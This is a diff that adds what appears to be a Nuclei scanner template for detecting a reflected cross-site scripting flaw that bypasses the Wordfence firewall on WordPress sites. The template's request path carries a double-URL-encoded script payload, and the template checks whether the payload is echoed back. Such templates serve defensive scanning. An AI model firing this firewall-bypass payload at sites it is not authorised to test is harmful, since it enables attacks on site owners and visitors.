@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - <script>alert(document.domain)</script>
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6'
+id: wordpress-wordfence-waf-bypass-xss
+info:
+    author: hackergautam
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+        cvss-score: 5.4
+        cwe-id: CWE-80
+    description: Wordpress Wordfence is vulnerable to cross-site scripting.
+    metadata:
+        max-request: 1
+    name: Wordpress Wordfence - Cross-Site Scripting
+    reference:
+        - https://twitter.com/naglinagli/status/1382082473744564226
+    severity: medium
+    tags:
+        - wordpress
+        - wordfence
+        - bypass
+        - WordPress
